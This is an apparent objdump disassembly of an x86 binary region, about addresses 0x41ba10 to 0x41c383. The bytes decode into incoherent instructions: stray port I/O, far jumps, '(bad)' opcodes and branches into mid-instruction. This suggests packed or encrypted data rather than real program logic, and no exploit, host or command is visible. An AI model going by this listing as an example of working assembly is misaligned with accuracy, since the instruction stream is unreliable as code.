  41ba10:	neg    ebp
  41ba12:	adc    DWORD PTR [edx-0x11944a1e],esp
  41ba18:	mov    edx,0x734c36dd
  41ba1d:	gs pop ebx
  41ba1f:	pop    esi
  41ba20:	add    eax,0x6000bcdd
  41ba25:	jns    0x41ba64
  41ba27:	jl     0x41b9bb
  41ba29:	add    al,0xda
  41ba2b:	jle    0x41ba61
  41ba2d:	std    
  41ba2e:	mov    ecx,0xd4d4347c
  41ba33:	clc    
  41ba34:	pop    ds
  41ba35:	loop   0x41baa5
  41ba37:	mov    dh,0xc5
  41ba39:	mov    eax,ds:0xaeb595b
  41ba3e:	pushf  
  41ba3f:	addr16 mov esp,0x54f316c3
  41ba45:	gs add al,0x72
  41ba48:	in     al,0x1f
  41ba4a:	or     eax,0xc8342bc1
  41ba4f:	lods   eax,DWORD PTR ds:[esi]
  41ba50:	lahf   
  41ba51:	addr16 mov ebp,0xe1cab659
  41ba57:	sbb    eax,0xa5c06dc0
  41ba5c:	repnz into 
  41ba5e:	pusha  
  41ba5f:	mov    ds:0xf067f07b,al
  41ba64:	dec    esi
  41ba65:	inc    edx
  41ba66:	sbb    eax,0x10c8e8b5
  41ba6b:	jno    0x41ba1c
  41ba6d:	stc    
  41ba6e:	xchg   esp,eax
  41ba6f:	pop    ebx
  41ba70:	in     eax,dx
  41ba71:	jne    0x41ba2c
  41ba73:	mov    ds:0x1e199217,al
  41ba78:	imul   ecx,esi,0xfffffff2
  41ba7b:	add    BYTE PTR [esp+eax*8-0x60],0x0
  41ba80:	pop    esp
  41ba81:	adc    al,0x29
  41ba83:	imul   edx,DWORD PTR [esi+edi*2-0x2339a3fa],0xedac8961
  41ba8e:	sub    al,0xe
  41ba90:	push   ss
  41ba91:	into   
  41ba92:	or     BYTE PTR [esi],al
  41ba94:	pop    ss
  41ba95:	add    edx,DWORD PTR [esi+0x2f6fb49b]
  41ba9b:	push   0x4c
  41ba9d:	fcom   QWORD PTR [ebp+ebx*1+0x583bc7cc]
  41baa4:	fist   DWORD PTR [eiz*2-0x69792af5]
  41baab:	pop    edx
  41baac:	addr16 jmp 0x6d79649a
  41bab2:	popf   
  41bab3:	ror    DWORD PTR [ecx+0x74],cl
  41bab6:	inc    esi
  41bab7:	sbb    al,0xa9
  41bab9:	jo     0x41bab2
  41babb:	imul   eax,edi,0xc
  41babe:	jp     0x41baee
  41bac0:	fadd   st,st(2)
  41bac2:	jno    0x41baa3
  41bac4:	das    
  41bac5:	pop    esi
  41bac6:	retf   0x4f0d
  41bac9:	popf   
  41baca:	aad    0xfe
  41bacc:	ja     0x41bae0
  41bace:	(bad)  
  41bacf:	push   esp
  41bad0:	add    BYTE PTR [esi],dh
  41bad2:	dec    ebp
  41bad3:	xor    al,0xd5
  41bad5:	xchg   ecx,eax
  41bad7:	add    DWORD PTR [edi+0x4],esi
  41bada:	adc    eax,0xce18f43f
  41badf:	mov    eax,0x6190b376
  41bae4:	push   0x3
  41bae6:	stos   BYTE PTR es:[edi],al
  41bae7:	dec    esp
  41bae8:	xchg   edi,eax
  41bae9:	test   DWORD PTR [ebx+edx*1],0x4f3673e5
  41baf0:	xor    al,0x83
  41baf2:	js     0x41ba9a
  41baf4:	(bad)  [ebx+eiz*2+0x29]
  41baf8:	ss xchg ecx,eax
  41bafa:	in     eax,0xf2
  41bafc:	fsubr  QWORD PTR [ecx-0x4da16cc8]
  41bb02:	shr    BYTE PTR es:[esi],1
  41bb05:	jnp    0x41bab7
  41bb07:	shl    BYTE PTR [ebp-0x7c],1
  41bb0a:	shr    BYTE PTR [ebp+0x27],cl
  41bb0d:	(bad)  
  41bb0e:	test   BYTE PTR [eax-0x3c605f3d],dh
  41bb14:	inc    esp
  41bb15:	(bad)  [ecx-0x20]
  41bb18:	pop    edi
  41bb19:	mov    ds:0x3d4c2b27,al
  41bb1e:	scas   eax,DWORD PTR es:[edi]
  41bb1f:	out    dx,eax
  41bb20:	push   ecx
  41bb21:	(bad)  
  41bb22:	out    dx,eax
  41bb23:	or     dh,al
  41bb25:	pusha  
  41bb26:	(bad)  
  41bb27:	mov    edi,cs
  41bb29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb2a:	jl     0x41bac0
  41bb2c:	dec    ebx
  41bb2d:	call   0x253a:0x98256f5b
  41bb34:	push   0xc14a2c27
  41bb39:	xchg   DWORD PTR [eax],ebp
  41bb3b:	adc    edi,DWORD PTR [ecx+esi*4-0x4f]
  41bb3f:	mov    ecx,0x69be525f
  41bb44:	lods   eax,DWORD PTR ds:[esi]
  41bb45:	jl     0x41bb4a
  41bb47:	and    DWORD PTR [ecx+0x6c254dd8],edi
  41bb4d:	into   
  41bb4e:	retf   0x949
  41bb51:	lock and bl,BYTE PTR [ebx+0x3f]
  41bb55:	shr    ecx,1
  41bb57:	jae    0x41baf6
  41bb59:	pop    ebp
  41bb5a:	ficom  WORD PTR [ebx]
  41bb5c:	lds    ecx,FWORD PTR [eax]
  41bb5e:	mov    ebx,0xb3b47c2f
  41bb63:	in     al,0xd6
  41bb65:	sub    ecx,edi
  41bb67:	rol    DWORD PTR [esi-0x76],1
  41bb6a:	and    cl,bh
  41bb6c:	int3   
  41bb6d:	test   al,0x97
  41bb6f:	pop    ecx
  41bb70:	fidivr WORD PTR [edx+0x23]
  41bb73:	retf   
  41bb74:	mov    BYTE PTR [esi+ebx*1+0x1613820],0xdb
  41bb7c:	dec    eax
  41bb7d:	xchg   ecx,eax
  41bb7e:	cmp    al,bl
  41bb80:	leave  
  41bb81:	jge    0x41bb2f
  41bb83:	inc    edi
  41bb84:	jnp    0x41bba2
  41bb86:	push   esp
  41bb87:	aas    
  41bb88:	not    DWORD PTR [ecx+0x107bfc78]
  41bb8e:	sub    ch,dl
  41bb90:	loop   0x41bb7d
  41bb92:	mov    edi,0x59db25db
  41bb97:	pop    ds
  41bb98:	retf   
  41bb99:	jle    0x41bb80
  41bb9b:	(bad)  
  41bb9d:	dec    ecx
  41bb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb9f:	sub    DWORD PTR es:[ebx],ecx
  41bba2:	inc    edx
  41bba3:	ins    DWORD PTR es:[edi],dx
  41bba4:	cwde   
  41bba5:	and    al,0x61
  41bba7:	sahf   
  41bba8:	out    dx,eax
  41bba9:	mov    bl,0x43
  41bbab:	enter  0x2ae8,0x3b
  41bbaf:	jmp    0x41bc14
  41bbb1:	and    edx,DWORD PTR [edx+0x6333f98b]
  41bbb7:	imul   esp,DWORD PTR [ebx],0xffffffed
  41bbba:	(bad)  [edi-0x68]
  41bbbd:	dec    ecx
  41bbbe:	mov    dh,0xa7
  41bbc0:	test   dl,bl
  41bbc2:	pop    edx
  41bbc3:	xchg   ebx,eax
  41bbc4:	iret   
  41bbc5:	and    cl,0xc2
  41bbc8:	and    edi,0xe70b5686
  41bbce:	pop    ecx
  41bbcf:	jns    0x41bb65
  41bbd1:	outs   dx,BYTE PTR ds:[esi]
  41bbd2:	ret    0xdd41
  41bbd5:	loope  0x41bbf5
  41bbd7:	inc    edi
  41bbd8:	je     0x41bc03
  41bbda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbdb:	jo     0x41bb76
  41bbdd:	test   ebp,0x59821f46
  41bbe3:	inc    edi
  41bbe4:	inc    esi
  41bbe5:	mul    ah
  41bbe7:	and    BYTE PTR [ebp-0x5d67a44],0x38
  41bbee:	mov    ebx,0xbbb7fb6
  41bbf3:	sahf   
  41bbf4:	mov    dl,0x83
  41bbf6:	inc    esi
  41bbf7:	xor    cl,dl
  41bbf9:	popa   
  41bbfa:	pop    esp
  41bbfb:	mov    ah,0xd3
  41bbfd:	mov    edx,0xf039429e
  41bc02:	pop    eax
  41bc03:	xchg   ecx,eax
  41bc04:	in     eax,dx
  41bc05:	aad    0x21
  41bc07:	mov    al,ds:0xc1f2bb8
  41bc0c:	add    di,WORD PTR [eax+eax*4]
  41bc10:	call   0xe42cdbd5
  41bc15:	aaa    
  41bc16:	adc    bh,BYTE PTR [edi-0x45]
  41bc19:	mov    ch,0x19
  41bc1b:	pop    ecx
  41bc1c:	xchg   ebp,eax
  41bc1d:	ds mov ebx,0x2a56361e
  41bc23:	sub    BYTE PTR [ebx+0x73],bl
  41bc26:	add    edx,DWORD PTR [ebx+edi*1-0x5e]
  41bc2a:	int    0x73
  41bc2c:	inc    eax
  41bc2d:	repnz mov esi,0x26bd643a
  41bc33:	in     al,dx
  41bc34:	jmp    0x41bca8
  41bc36:	xor    BYTE PTR ds:0xccd32598,bh
  41bc3c:	mov    ds:0xa70b97c9,al
  41bc41:	dec    esp
  41bc42:	fiadd  DWORD PTR [edx-0x46]
  41bc45:	mov    edi,0xe97c65e9
  41bc4a:	imul   ecx,DWORD PTR ds:0x733dbcf,0x42
  41bc51:	loope  0x41bbe8
  41bc53:	addr16 ss jp 0x41bc0a
  41bc57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc58:	sbb    al,0xa5
  41bc5a:	imul   di,WORD PTR [ecx-0x6b],0x4eaf
  41bc60:	mov    dl,0xbf
  41bc62:	sub    ah,BYTE PTR [ecx]
  41bc64:	jne    0x41bc30
  41bc66:	iret   
  41bc67:	mov    ebx,0xd8776530
  41bc6c:	mov    edx,0xf873330a
  41bc71:	adc    eax,0x19fa4c37
  41bc76:	sub    bh,ch
  41bc78:	jmp    0x8641bdde
  41bc7d:	adc    esi,DWORD PTR ds:0x8ffde511
  41bc83:	push   es
  41bc84:	stos   BYTE PTR es:[edi],al
  41bc85:	dec    edi
  41bc86:	adc    al,0xac
  41bc88:	mov    bh,0xaa
  41bc8a:	int3   
  41bc8b:	ror    DWORD PTR [eax-0x7c],cl
  41bc8e:	inc    ebx
  41bc8f:	dec    ebx
  41bc90:	cmp    ecx,DWORD PTR [eax+0x11]
  41bc93:	out    0x67,eax
  41bc95:	outs   dx,DWORD PTR ds:[esi]
  41bc96:	jbe    0x41bc44
  41bc98:	inc    edi
  41bc99:	test   ebp,eax
  41bc9b:	add    eax,0xf90c281d
  41bca0:	pop    ebx
  41bca1:	push   ds
  41bca2:	add    ah,dh
  41bca4:	int3   
  41bca5:	push   es
  41bca6:	and    eax,edx
  41bca8:	xlat   BYTE PTR ds:[ebx]
  41bca9:	pop    edi
  41bcaa:	adc    DWORD PTR [edx],esp
  41bcac:	dec    ebp
  41bcad:	int    0x73
  41bcaf:	push   edi
  41bcb0:	xor    DWORD PTR [ebp+ebp*8-0x20],ecx
  41bcb4:	adc    eax,0xa664bfec
  41bcb9:	das    
  41bcba:	mov    es,ebp
  41bcbc:	adc    DWORD PTR [ebp+eax*1-0x6c6a9db9],ebp
  41bcc3:	push   ecx
  41bcc4:	daa    
  41bcc5:	push   edi
  41bcc6:	pop    esi
  41bcc7:	outs   dx,BYTE PTR ds:[esi]
  41bcc8:	jno    0x41bcb6
  41bcca:	repz hlt 
  41bccc:	std    
  41bccd:	out    dx,eax
  41bcce:	rcr    DWORD PTR [eax-0x3b],1
  41bcd1:	ss sahf 
  41bcd3:	popa   
  41bcd4:	dec    eax
  41bcd5:	call   0x2a4d:0x4435227e
  41bcdc:	loop   0x41bcd4
  41bcde:	mov    edi,0x495fcf63
  41bce3:	inc    ebx
  41bce4:	stos   BYTE PTR es:[edi],al
  41bce5:	dec    ebp
  41bce6:	mov    bh,0xce
  41bce8:	lods   eax,DWORD PTR ds:[esi]
  41bce9:	mov    edi,0xbc1a756
  41bcee:	xchg   ebx,eax
  41bcef:	mov    DWORD PTR [edx],0x404c088b
  41bcf5:	xchg   BYTE PTR [eax-0xec4cbf1],ch
  41bcfb:	fwait
  41bcfc:	mov    bl,BYTE PTR [edx+0x6419404f]
  41bd02:	push   0x220140e4
  41bd07:	shl    al,cl
  41bd09:	(bad)  
  41bd0a:	clc    
  41bd0b:	jne    0x41bd87
  41bd0d:	retf   0x4645
  41bd10:	inc    ecx
  41bd11:	sbb    al,0xf
  41bd13:	mov    dl,0x39
  41bd15:	fdiv   DWORD PTR [edx]
  41bd17:	out    0xe7,eax
  41bd19:	ds pop ebp
  41bd1b:	fistp  QWORD PTR [eax]
  41bd1d:	lock ror DWORD PTR [edi+0x56ae60fc],0xd
  41bd25:	into   
  41bd26:	push   ebp
  41bd27:	data16 stos BYTE PTR es:[edi],al
  41bd29:	jl     0x41bd08
  41bd2b:	xchg   DWORD PTR [ebx-0x15],ebp
  41bd2e:	add    BYTE PTR [ebp-0x78595aaa],bl
  41bd34:	jecxz  0x41bcf6
  41bd36:	xchg   esi,eax
  41bd37:	inc    esi
  41bd38:	in     al,0x8f
  41bd3a:	bnd jl 0x41bd56
  41bd3d:	mov    edx,0x9e662557
  41bd42:	xor    BYTE PTR [ebx-0x64],dh
  41bd45:	cmc    
  41bd46:	ret    
  41bd47:	scas   eax,DWORD PTR es:[edi]
  41bd48:	(bad)  
  41bd49:	xor    ch,BYTE PTR [eax-0x4fa4dd1]
  41bd4f:	mov    edi,0xca5b8b88
  41bd54:	aam    0x13
  41bd56:	repnz xchg ecx,eax
  41bd58:	hlt    
  41bd59:	pop    edx
  41bd5a:	in     al,dx
  41bd5b:	ja     0x41bdd5
  41bd5d:	mov    WORD PTR [esi-0x65],es
  41bd60:	outs   dx,BYTE PTR ds:[esi]
  41bd61:	js     0x41bcff
  41bd63:	add    bh,BYTE PTR [ecx+0xa8fca25]
  41bd69:	or     edx,esi
  41bd6b:	jmp    0xd2f39cd9
  41bd70:	push   es
  41bd71:	sbb    BYTE PTR [ebx-0x43844e25],ah
  41bd77:	test   al,0x80
  41bd79:	mov    ss,ecx
  41bd7b:	bound  eax,QWORD PTR [eax-0x5bda08f4]
  41bd81:	retf   0x1e5e
  41bd84:	inc    edx
  41bd85:	or     al,0xcc
  41bd87:	aad    0x9d
  41bd89:	sbb    eax,edx
  41bd8b:	scas   eax,DWORD PTR es:[edi]
  41bd8c:	sbb    BYTE PTR [eax+eiz*1-0x70],dh
  41bd90:	mov    esp,0xe19124fc
  41bd96:	retf   
  41bd97:	rcl    BYTE PTR [ebx],0x9f
  41bd9a:	aad    0x22
  41bd9c:	adc    ch,BYTE PTR ss:[esi+0x37720825]
  41bda3:	lea    eax,[ebp+0x11f28890]
  41bda9:	shl    BYTE PTR [ebx],1
  41bdab:	sub    eax,0x663ebde4
  41bdb0:	xor    edx,DWORD PTR [ebp+eax*2-0x40]
  41bdb4:	adc    BYTE PTR [esi+0x12577054],bh
  41bdba:	or     DWORD PTR [ecx-0x19f3fb03],0x4aeee9de
  41bdc4:	xchg   ebp,eax
  41bdc5:	test   DWORD PTR [esi+0x12],ecx
  41bdc8:	inc    edi
  41bdc9:	js     0x41be26
  41bdcb:	(bad)  
  41bdcd:	xor    BYTE PTR [ebp-0x6d209daf],ch
  41bdd3:	push   ss
  41bdd4:	lds    edx,FWORD PTR [esi]
  41bdd6:	cmp    al,0x10
  41bdd8:	ins    BYTE PTR es:[edi],dx
  41bdd9:	sub    DWORD PTR [eax+0x4e],edi
  41bddc:	ins    BYTE PTR es:[edi],dx
  41bddd:	sar    DWORD PTR [edi-0x727403f2],1
  41bde3:	cmp    ebx,eax
  41bde5:	into   
  41bde6:	bt     ecx,ecx
  41bde9:	test   DWORD PTR [edi-0x6e],ebx
  41bdec:	stos   DWORD PTR es:[edi],eax
  41bded:	adc    eax,0x2f000f03
  41bdf2:	lods   al,BYTE PTR ds:[esi]
  41bdf3:	mov    edx,0xad7b4903
  41bdf8:	outs   dx,BYTE PTR ss:[esi]
  41bdfa:	sub    eax,0x74f5d25e
  41bdff:	cmp    al,0x4f
  41be01:	push   ebx
  41be02:	xchg   cl,dl
  41be04:	push   esi
  41be05:	scas   al,BYTE PTR es:[edi]
  41be06:	cmp    eax,0xbd6041f
  41be0b:	inc    edi
  41be0c:	or     BYTE PTR [edx+ebx*4-0x6c1d3be7],cl
  41be13:	cmp    eax,0x580c1f81
  41be18:	sub    ecx,DWORD PTR [ebx-0x38]
  41be1b:	cmp    ecx,DWORD PTR [ebx+0x98c6d50]
  41be21:	mov    eax,0x6f45deb7
	...
  41c002:	adc    al,0xcb
  41c004:	mov    bl,0x9a
  41c006:	(bad)  
  41c007:	cli    
  41c008:	cmp    eax,0x190968cf
  41c00d:	mov    ebp,DWORD PTR [edx-0xa]
  41c010:	mov    ds:0x1a21704,al
  41c015:	add    BYTE PTR [edx],ah
  41c017:	pop    es
  41c018:	add    BYTE PTR [eax],al
  41c01a:	sub    ebx,0xdfc5aac2
  41c020:	inc    ebx
  41c021:	push   ecx
  41c022:	sub    eax,ebp
  41c024:	jl     0x41c0a1
  41c026:	jbe    0x41c011
  41c028:	cmp    DWORD PTR [ebx+0x29da3ced],ebx
  41c02e:	scas   eax,DWORD PTR es:[edi]
  41c02f:	mov    dl,0xc7
  41c031:	out    dx,al
  41c032:	das    
  41c033:	es adc dh,dh
  41c036:	dec    BYTE PTR [esi-0x2e]
  41c039:	jmp    0xe1a9dd73
  41c03e:	aas    
  41c03f:	jl     0x41c041
  41c041:	push   cs
  41c042:	pop    ds
  41c043:	sahf   
  41c044:	jns    0x41c050
  41c046:	push   ss
  41c047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c048:	and    al,0x92
  41c04a:	add    bh,cl
  41c04c:	pop    esi
  41c04d:	push   ss
  41c04e:	mov    dl,0x8b
  41c050:	cwde   
  41c051:	mov    edi,0xe246b675
  41c056:	ficom  WORD PTR [esi+0x339dbcf0]
  41c05c:	jo     0x41c0a9
  41c05e:	pop    edi
  41c05f:	rcr    DWORD PTR [ebx],0xf6
  41c062:	pop    esi
  41c063:	cmp    DWORD PTR [ebp+0x8705f5b],edx
  41c069:	jbe    0x41c03a
  41c06b:	cwde   
  41c06c:	pushf  
  41c06d:	sub    DWORD PTR [ecx],0xffffffe3
  41c070:	jg     0x41c09e
  41c072:	fnstcw WORD PTR [edx+0x38686624]
  41c078:	nop
  41c079:	push   ebp
  41c07a:	int3   
  41c07b:	push   0x573ee817
  41c080:	test   BYTE PTR [ebx],0xcb
  41c083:	push   cs
  41c084:	and    eax,0x7e67f6b9
  41c089:	cdq    
  41c08a:	fistp  QWORD PTR [edx+0x66d41791]
  41c090:	dec    edi
  41c091:	inc    edx
  41c092:	leave  
  41c093:	mov    edx,DWORD PTR [bp+si+0x78]
  41c097:	xor    al,0xd6
  41c099:	fwait
  41c09a:	aad    0x3f
  41c09c:	mov    ebp,0x6c15783b
  41c0a1:	leave  
  41c0a2:	movd   DWORD PTR fs:[ecx],mm0
  41c0a6:	fsub   st,st(5)
  41c0a8:	mov    ebx,0x29b51530
  41c0ad:	jecxz  0x41c0fd
  41c0af:	lock fld DWORD PTR [ecx-0x483fdb2]
  41c0b6:	cld    
  41c0b7:	add    ecx,DWORD PTR [edx]
  41c0b9:	sbb    BYTE PTR [eax-0x1c],bh
  41c0bc:	(bad)  
  41c0bd:	mov    ch,BYTE PTR [ebp+0x2f277154]
  41c0c3:	mov    dh,0xf0
  41c0c5:	nop
  41c0c6:	inc    bh
  41c0c8:	sub    ch,cl
  41c0ca:	shr    BYTE PTR [ebx-0xc2f0e9a],cl
  41c0d0:	mov    eax,0x894dc214
  41c0d5:	pop    ebx
  41c0d6:	cs jl  0x41c0ca
  41c0d9:	cmp    cl,BYTE PTR [edi-0x92d3b65]
  41c0df:	or     BYTE PTR [ecx],ch
  41c0e1:	fist   DWORD PTR [ebx-0x5fe71ccf]
  41c0e7:	ins    DWORD PTR es:[edi],dx
  41c0e8:	mov    WORD PTR [ebx-0x21bafa09],?
  41c0ee:	pop    eax
  41c0ef:	inc    eax
  41c0f0:	jbe    0x41c166
  41c0f2:	dec    eax
  41c0f3:	mov    edx,DWORD PTR [edx]
  41c0f5:	das    
  41c0f6:	(bad)  
  41c0f7:	add    eax,0xcccee338
  41c0fc:	adc    eax,0x68becff4
  41c101:	dec    edi
  41c102:	jmp    0x1a68:0x3b854d82
  41c109:	div    BYTE PTR [ebx-0x34c397f2]
  41c10f:	aas    
  41c110:	popf   
  41c111:	mov    ebp,DWORD PTR [ebx+0x3d]
  41c114:	mov    edi,DWORD PTR ds:0xc796d6a7
  41c11a:	xor    esp,DWORD PTR [esi]
  41c11c:	jle    0x41c106
  41c11e:	push   ds
  41c11f:	fld    st(0)
  41c121:	cld    
  41c122:	dec    ebp
  41c123:	mov    dl,0x76
  41c125:	mov    ebx,0x10a6dcfc
  41c12a:	in     eax,0x5a
  41c12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c12d:	jb     0x41c0f3
  41c12f:	cli    
  41c130:	popa   
  41c131:	cmp    BYTE PTR [ebx],dl
  41c133:	retf   
  41c134:	or     eax,0x960b1b40
  41c139:	jmp    0x392d:0xb4e87787
  41c140:	mov    ss,WORD PTR [ebx]
  41c142:	stc    
  41c143:	add    eax,edi
  41c145:	stos   BYTE PTR es:[edi],al
  41c146:	xchg   esi,eax
  41c147:	std    
  41c148:	int3   
  41c149:	mov    edx,0x8768fe47
  41c14e:	jmp    0xd9726f4d
  41c153:	scas   al,BYTE PTR es:[edi]
  41c154:	sbb    edi,esp
  41c156:	xor    dl,BYTE PTR [esi+edi*1-0xc]
  41c15a:	lock jecxz 0x41c128
  41c15d:	or     eax,0x3da1f9df
  41c162:	repz pop edi
  41c164:	push   ebx
  41c165:	fisttp QWORD PTR ds:0x5df4438a
  41c16b:	adc    BYTE PTR [esi+0x15200205],cl
  41c171:	in     eax,dx
  41c172:	push   ds
  41c173:	add    al,0x11
  41c175:	xor    DWORD PTR [ecx+0x52],ebx
  41c178:	adc    eax,0x46885522
  41c17d:	xchg   ebx,eax
  41c17e:	(bad)  
  41c17f:	cli    
  41c180:	jae    0x41c107
  41c182:	cmp    al,0x9b
  41c184:	jnp    0x41c137
  41c186:	mov    ch,BYTE PTR [edi-0x14]
  41c189:	iret   
  41c18a:	mov    BYTE PTR [ebx+0x7c],ah
  41c18d:	pop    es
  41c18e:	jbe    0x41c1bd
  41c190:	jmp    0x41c19b
  41c192:	sbb    DWORD PTR [edx+eiz*8-0x67eee4a6],edi
  41c199:	inc    ebp
  41c19a:	sar    DWORD PTR [edi+0x16],cl
  41c19d:	lock inc ecx
  41c19f:	outs   dx,BYTE PTR ds:[esi]
  41c1a0:	and    eax,0x4296c736
  41c1a5:	xchg   esp,eax
  41c1a6:	mov    ecx,0x4d3824f5
  41c1ab:	jnp    0x41c17b
  41c1ad:	sub    eax,0x9fac8b58
  41c1b2:	cmp    al,0xcf
  41c1b4:	push   ebp
  41c1b5:	ja     0x41c13b
  41c1b7:	pop    edi
  41c1b8:	sbb    eax,0x34a54324
  41c1bd:	out    0x8e,al
  41c1bf:	stos   DWORD PTR es:[edi],eax
  41c1c0:	repz push esi
  41c1c2:	and    dh,BYTE PTR [esi-0x3c]
  41c1c5:	jge    0x41c1ff
  41c1c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1c9:	and    dh,BYTE PTR [eax+0x77]
  41c1cc:	mov    bh,0xd2
  41c1ce:	pushf  
  41c1cf:	mov    dl,0x8f
  41c1d1:	das    
  41c1d2:	inc    ebp
  41c1d3:	ret    0xdbf1
  41c1d6:	sub    al,0x19
  41c1d8:	sar    DWORD PTR [ebp-0x2a9e330b],1
  41c1de:	and    DWORD PTR [esi-0x4c88c2c6],0xffffff87
  41c1e5:	cmp    al,0x9c
  41c1e7:	in     al,0x84
  41c1e9:	cmp    eax,0xd270e9f2
  41c1ee:	mov    ebp,0xa5b0fc45
  41c1f3:	pop    ds
  41c1f4:	fbld   TBYTE PTR [edi-0x3e8354f3]
  41c1fa:	pop    ecx
  41c1fb:	ror    BYTE PTR [edi+0x21],0xa3
  41c1ff:	push   ds
  41c200:	inc    esi
  41c201:	jle    0x41c1f0
  41c203:	jp     0x41c261
  41c205:	add    DWORD PTR [ebx],edi
  41c207:	jno    0x41c1ae
  41c209:	lea    esp,[eax+0x227f6758]
  41c20f:	ins    BYTE PTR es:[edi],dx
  41c210:	pop    ds
  41c211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c212:	cdq    
  41c213:	daa    
  41c214:	int    0xee
  41c216:	jge    0x41c285
  41c218:	xchg   DWORD PTR [esi+edi*2-0x65],eax
  41c21c:	add    ch,BYTE PTR [ecx+0x6a]
  41c21f:	pop    ebx
  41c220:	(bad)  
  41c221:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c222:	rcr    BYTE PTR ds:0xc3b7a93d,0x18
  41c229:	fwait
  41c22a:	push   esp
  41c22b:	jl     0x41c1e1
  41c22d:	out    0xd5,al
  41c22f:	xor    dl,BYTE PTR [edi-0x6]
  41c232:	xor    ecx,DWORD PTR [esi-0x1eed1887]
  41c238:	in     al,0x74
  41c23a:	lock je 0x41c264
  41c23d:	in     al,0x7b
  41c23f:	es and al,0x4d
  41c242:	pop    es
  41c243:	out    dx,eax
  41c244:	push   edx
  41c245:	and    bh,BYTE PTR [ebx]
  41c247:	jbe    0x41c217
  41c249:	mov    DWORD PTR [esi+0x1b],edx
  41c24c:	scas   al,BYTE PTR es:[edi]
  41c24d:	or     bh,BYTE PTR [edi+0x424da404]
  41c253:	ja     0x41c231
  41c255:	in     al,dx
  41c256:	add    DWORD PTR [ebx+0x77],ebp
  41c259:	push   ds
  41c25a:	out    0x50,eax
  41c25c:	adc    bl,bh
  41c25e:	jo     0x41c238
  41c260:	and    DWORD PTR [esi+0x4e4799bd],edx
  41c266:	or     dh,dh
  41c268:	stos   DWORD PTR es:[edi],eax
  41c269:	loopne 0x41c24b
  41c26b:	mov    ?,WORD PTR [ecx]
  41c26d:	into   
  41c26e:	scas   eax,DWORD PTR es:[edi]
  41c26f:	sub    cl,BYTE PTR [edi]
  41c271:	mov    DWORD PTR [eax+0x5f],edx
  41c274:	mov    al,ds:0xefa0f135
  41c279:	rcr    edi,1
  41c27b:	xchg   ebx,eax
  41c27c:	sub    BYTE PTR [ecx+0x1efb722b],ch
  41c282:	gs dec edi
  41c284:	fsub   st,st(0)
  41c286:	or     eax,0xf09dd805
  41c28b:	cdq    
  41c28c:	push   ebp
  41c28d:	icebp  
  41c28e:	adc    ecx,ebx
  41c290:	dec    ecx
  41c291:	fistp  WORD PTR [ebx]
  41c293:	scas   eax,DWORD PTR es:[edi]
  41c294:	mov    eax,0xe10152b5
  41c299:	cs inc ebx
  41c29b:	xchg   BYTE PTR [esi-0x34b40042],bl
  41c2a1:	retf   
  41c2a2:	jg     0x41c2fa
  41c2a4:	dec    edx
  41c2a5:	popa   
  41c2a6:	xchg   edx,eax
  41c2a7:	mov    al,ds:0xa83cca66
  41c2ac:	int3   
  41c2ad:	xor    cl,dl
  41c2af:	rcr    DWORD PTR [ebx],0xa2
  41c2b2:	mov    bh,0xc6
  41c2b4:	(bad)  
  41c2b5:	icebp  
  41c2b6:	call   0x956a:0xb43aebe5
  41c2bd:	stos   DWORD PTR es:[edi],eax
  41c2be:	cmp    bh,BYTE PTR [ecx]
  41c2c0:	mov    ch,0x25
  41c2c2:	mov    edx,0x6ff8092a
  41c2c7:	mov    bh,0x4c
  41c2c9:	and    BYTE PTR [edx],al
  41c2cb:	dec    edx
  41c2cc:	jg     0x41c309
  41c2ce:	popf   
  41c2cf:	in     eax,dx
  41c2d0:	setbe  BYTE PTR [edi+0x5e]
  41c2d4:	or     ch,BYTE PTR [esi+0x32c8c5d7]
  41c2da:	mov    ds:0x2ecefc2a,al
  41c2df:	fisubr DWORD PTR [ebx+0x441dd2fe]
  41c2e5:	cmc    
  41c2e6:	(bad)  [esi-0x76f56271]
  41c2ec:	sub    eax,0xa60305a2
  41c2f1:	aaa    
  41c2f2:	ds cmp al,0xe5
  41c2f5:	xchg   BYTE PTR [esi],bh
  41c2f7:	sub    bh,al
  41c2f9:	js     0x41c31a
  41c2fb:	xchg   ecx,eax
  41c2fc:	xchg   esi,eax
  41c2fd:	pop    eax
  41c2fe:	push   es
  41c2ff:	mov    ds:0xf68b0f49,eax
  41c304:	ds ja  0x41c29f
  41c307:	sbb    BYTE PTR [esi-0x3cab8ac3],dl
  41c30d:	jge    0x41c359
  41c30f:	push   esi
  41c310:	fs pop ss
  41c312:	loop   0x41c386
  41c314:	sub    eax,0x3d78714b
  41c319:	inc    esi
  41c31a:	(bad)
  41c31d:	sub    eax,0xfc97c308
  41c322:	cld    
  41c323:	mov    ebp,gs
  41c325:	add    DWORD PTR [ebp+ebp*8+0x4e],esp
  41c329:	add    eax,DWORD PTR ds:0x25b21f19
  41c32f:	movsx  esi,BYTE PTR [ebp-0x28807cd]
  41c336:	gs dec ebx
  41c338:	dec    esp
  41c339:	xor    eax,0xf8df3055
  41c33e:	int3   
  41c33f:	jmp    0xc9f1:0xf23e6d9
  41c346:	mov    dl,0x50
  41c348:	scas   eax,DWORD PTR es:[edi]
  41c349:	jbe    0x41c31e
  41c34b:	dec    esi
  41c34c:	ins    BYTE PTR es:[edi],dx
  41c34d:	sub    eax,0x80c33849
  41c352:	popa   
  41c353:	sub    DWORD PTR [esi-0x1021ff4d],0x9bb1ab57
  41c35d:	dec    esp
  41c35e:	data16 jns 0x41c38d
  41c361:	outs   dx,BYTE PTR ds:[esi]
  41c362:	std    
  41c363:	sbb    BYTE PTR [eax],cl
  41c365:	cwde   
  41c366:	call   0x75994aec
  41c36b:	add    ah,bl
  41c36d:	out    0x36,eax
  41c36f:	jmp    0x41c300
  41c371:	push   cs
  41c372:	jmp    0x12ec:0x3614e90f
  41c379:	popf   
  41c37a:	sub    bl,BYTE PTR [ebp-0x328d4e7]
  41c380:	lods   eax,DWORD PTR ds:[esi]
  41c381:	pusha  
  41c382:	pop    ds
  41c383:	loope  0x41c397
